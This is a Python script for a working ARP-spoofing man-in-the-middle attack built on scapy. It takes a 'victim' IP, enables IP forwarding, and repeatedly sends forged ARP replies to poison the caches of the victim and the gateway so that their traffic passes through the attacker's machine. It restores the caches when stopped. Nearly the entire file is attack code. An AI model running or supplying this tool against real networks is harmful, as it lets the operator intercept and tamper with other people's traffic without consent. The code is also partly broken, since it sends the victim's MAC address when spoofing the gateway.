import sys
import subprocess
import pathlib
import scapy.all as scapy
import time
import optparse
sys.path.append(str(pathlib.Path(__file__).parent.absolute(
).parent.absolute()) + r'/network_scanner')
import network_scanner_optparse as scanner


def find_gateway(net):
    get_gateway_command = f"arp -a | sed -n '/gateway.*{net}/ p' | sed  's/.*(\(.*\)).*/\\1/ g'"

    gateway = str(subprocess.check_output(get_gateway_command, shell=True)
                  ).replace(r"b'", '').replace("\\n'", '')
    return gateway


def check_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface",
                      help="Interface name to work with it for spoofing.")
    parser.add_option("-t", "--target", dest="target",
                      help="Victim machine ip.")

    (options, arguments) = parser.parse_args()
    return options


def get_interface(options):
    if not options.interface:
        machine_data = str(subprocess.check_output(
            r"ifconfig | sed 's/^\(.*\): /\1---\n/g' | sed 's/\s*\(ether.*\)/\1---/g' | sed -n '/.*---/p' | sed 's/---// g'", shell=True)).replace(r"b'", '').replace("'", '').split(r'\n')[:-1]

        start = 1
        relevant_interfaces = {}

        while start < len(machine_data):
            if 'ether' in machine_data[start]:
                relevant_interfaces[start] = machine_data[start - 1]
            start += 1

        print(
            f"\nThose are available interfaces:{relevant_interfaces}\nPlease choose the interface by index.Insert the number:")

        try:
            interface = relevant_interfaces[int(input())]
        except KeyError:
            print('Interface does not exist!!')
            return None
        return interface
    else:
        return options.interface


def get_target_ip(options):
    return None if not options.target else options.target


def get_mac(gateway, target):
    while True:
        try:
            mac_address = [el for el in scanner.scan(
                gateway + r'/24') if el['ip'] == target][0]['mac']
            break
        except IndexError as err:
            print(err)
            time.sleep(3.0)

    return mac_address


def dec_spoof(fn):
    subprocess.check_call(
        r'echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)

    def inner(*args, **kwargs):
        fn(*args, **kwargs)
    return inner


@dec_spoof
def spoof(target_ip, spoof_ip, mac):
    package = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
    scapy.send(package, verbose=False)


def restore(destination_ip, source_ip, mac):
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=mac,
                       psrc=source_ip, hwsrc=get_mac(source_ip, source_ip))
    scapy.send(packet, count=4, verbose=False)


if __name__ == '__main__':
    options = check_arguments()
    target = get_target_ip(options)
    if target:
        net = get_interface(options)
        gateway = find_gateway(net)
        sent_packets = 0
        target_mac = get_mac(gateway, target)
        try:
            while True:
                spoof(target, gateway, target_mac)
                spoof(gateway, target, target_mac)
                sent_packets += 2
                print(f"\r[+] Packets sent: {sent_packets}", end='')
                time.sleep(2)
        except KeyboardInterrupt:
            print('[+] Detected CTRL + C...Quitting.')

        restore(target, gateway, target_mac)
        restore(gateway, target, target_mac)
    else:
        print('ERROR.Nor target\'s ip machine is provided!!')
        net = get_interface(options)
        gateway = find_gateway(net)
        print('\nAvailable machines:\n')
        print(scanner.print_results(scanner.scan(gateway + r'/24')))
